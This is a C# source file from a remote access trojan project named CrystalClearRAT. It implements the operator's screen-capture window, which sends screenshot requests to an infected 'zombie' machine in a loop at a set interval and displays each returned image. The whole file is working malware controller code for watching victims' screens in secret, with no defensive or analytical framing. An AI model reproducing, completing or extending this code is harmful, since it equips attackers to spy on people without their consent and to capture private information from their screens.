using CrystalClearRAT.Event;
using CrystalClearRAT.Functions;
using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Interaction logic for ScreenCaptureWindow.xaml
    /// </summary>
    public partial class ScreenCaptureWindow : Window
    {
        public static bool isRunning = false;

        private bool capturing = false;
        private readonly int minInterval = 100;
        private int refreshInterval;
        private Zombie zombie;

        private static readonly ManualResetEvent doneReceiving = new ManualResetEvent(false);
        CancellationTokenSource cts = new CancellationTokenSource();




        public ScreenCaptureWindow(Zombie zombie)
        {
            if (isRunning)
            {
                this.Close();
            }
            isRunning = true;
            this.zombie = zombie;
            FunctionManager.ImageReceived += OnImageReceived;
            InitializeComponent();
            refreshInterval = int.Parse(intervalTextBox.Text);
        }

        private void OnImageReceived(object sender, EventArgs e)
        {
            doneReceiving.Set();
            byte[] img = (e as ImageArgs).Data;

            Dispatcher.Invoke(() =>
            {
                screenImage.Source = BitmapToImageSource(img);
            });
        }

        private ImageSource BitmapToImageSource(byte[] img)
        {
            using (var ms = new MemoryStream(img))
            {

                ms.Seek(0, SeekOrigin.Begin);
                var bitmapImage = new BitmapImage();
                bitmapImage.BeginInit();
                bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                bitmapImage.StreamSource = ms;
                bitmapImage.EndInit();
                return bitmapImage;

            }
        }

        private async Task LoopRequestScreenshotAsync()
        {
            await Task.Run(() =>
            {
                while (capturing)
                {
                    doneReceiving.Reset();
                    Server.Send(Screenshot.Request(), zombie);
                    Thread.Sleep(refreshInterval);
                    doneReceiving.WaitOne();
                }

            }, cts.Token);
            Console.WriteLine("Canceled!");
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (capturing)
            {
                controlButton.Content = "Start";
                cts.Cancel();
                cts.Dispose();
                cts = new CancellationTokenSource();
                capturing = false;
                return;
            }

            int result;
            bool canParse = int.TryParse(intervalTextBox.Text, out result);

            if (canParse)
            {
                if (result >= minInterval)
                {
                    refreshInterval = result;
                    capturing = true;
                    controlButton.Content = "Stop";
                    LoopRequestScreenshotAsync();
                }
                else
                {
                    MessageBox.Show($"Minimum interval must be at least {minInterval}. Cannot set it to {result}.", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            else
            {
                MessageBox.Show("Invalid input", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            FunctionManager.ImageReceived -= OnImageReceived;
            isRunning = false;
        }
    }
}
